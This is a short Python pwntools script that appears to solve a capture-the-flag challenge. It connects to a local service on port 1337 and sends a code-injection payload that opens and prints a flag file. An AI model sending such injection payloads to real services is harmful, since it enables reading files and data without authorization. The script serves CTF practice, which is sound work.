from pwn import *

IP = "localhost"
PORT = 1337
r = remote(IP, PORT)
print(f"Running solver remotely at {IP} {PORT}\n")

r.sendline("print(open('endingdua/flag.txt','r').read())#")
print(f'{r.recvline_contains(b"FindITCTF").strip().decode()[2:]}\n')
